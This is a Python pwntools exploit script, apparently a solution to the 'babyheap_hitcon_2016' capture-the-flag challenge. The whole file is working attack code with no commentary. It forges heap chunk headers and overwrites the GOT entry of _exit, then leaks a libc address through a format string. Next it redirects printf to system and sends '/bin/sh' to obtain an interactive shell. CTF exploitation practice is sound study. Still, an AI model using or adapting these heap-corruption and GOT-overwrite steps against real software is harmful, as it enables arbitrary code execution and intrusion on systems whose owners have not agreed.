from pwn import *
#r = remote('node3.buuoj.cn',27921)
r = process('./babyheap_hitcon_2016')
elf = ELF('./babyheap_hitcon_2016')
libc = ELF('/libc-2.23.so')

def add(size,content,name):
	r.sendlineafter('Your choice:','1')
	r.sendlineafter('Size :',str(size))
	r.sendafter('Content:',content)
	r.sendafter('Name:',name)

def free():
	r.sendlineafter('Your choice:','2')

def edit(content):
	r.sendlineafter('Your choice:','3')
	r.sendafter('Content:',content)


r.sendafter('Your choice:','4')
r.recvuntil('(Y/n)')
chunk = 'n'+'\x00'*(0x1000-1-0x20)+p64(0)+p64(0x81)+p64(0)*2
r.sendline(chunk)
add(0x80,p64(0)*7+p64(0x21),'a'*8)
free()
add(0x70,p64(0)*3+p64(0x41)+p64(0x60)*2+p64(elf.got['_exit']),'aaaa')



payload = p64(0x400c9d)
payload += p64(elf.plt['read']+6)
payload += p64(elf.plt['puts']+6)
payload += p64(0)
payload += p64(elf.plt['printf']+6)
payload += p64(0) 
payload += p64(elf.plt['read']+6)
payload += p64(0)*4
payload += p64(elf.plt['printf']+6)
edit(payload)


r.recvuntil('Your choice:')
r.send('%7$p')
r.recvuntil('0x')
leak = int(r.recvuntil('Invalid',drop=True),16)
log.success(hex(leak))
libc_base = leak-362-libc.sym['_IO_puts']
log.success(hex(libc_base))
system=libc_base+libc.sym['system']
log.success(hex(system))
r.send('333')

payload = p64(0x400c9d)
payload += p64(elf.plt['read']+6)
payload += p64(elf.plt['puts']+6)
payload += p64(0)
payload += p64(elf.plt['printf']+6)
payload += p64(0) 
payload += p64(elf.plt['read']+6)
payload += p64(0)*4
payload += p64(system)
r.send(payload)
r.send('/bin/sh\x00')
r.interactive()